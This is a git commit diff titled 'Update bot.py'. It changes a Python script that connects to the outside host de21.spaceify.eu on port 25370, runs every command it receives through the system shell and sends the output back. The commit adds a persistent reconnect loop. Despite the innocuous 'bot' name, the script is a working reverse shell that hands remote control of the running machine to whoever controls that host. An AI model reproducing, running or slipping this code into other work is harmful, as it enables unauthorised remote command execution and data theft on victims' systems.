ae03c3f21ca34750d7659af5a198f1d88ba2641a
CooliePop <texthit053@gmail.com>
2025-09-10 16:40:32 +0700

    Update bot.py

--- bot.py
+++ bot.py
@@ -3,17 +3,30 @@ import subprocess
 
 host = "de21.spaceify.eu"
 port = 25370
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((host, port))
+def connect():
+    while True:
+        try:
+            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client.connect((host, port))
+            return client
+        except:
+            print("❌ Không kết nối được, thử lại sau 3s...")
+            time.sleep(5)
 
 while True:
-    cmd = client.recv(1024).decode()
-    if cmd.lower() == "exit":
-        break
+    client = connect()
     try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        while True:
+            cmd = client.recv(1024).decode()
+            if not cmd or cmd.lower() == "exit":
+                break
+            try:
+                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+            except Exception as e:
+                output = str(e).encode()
+            client.send(output)
     except Exception as e:
-        output = str(e).encode()
-    client.send(output)
+        print("Mất kết nối:", e)
+    finally:
+        client.close()
 
-client.close()
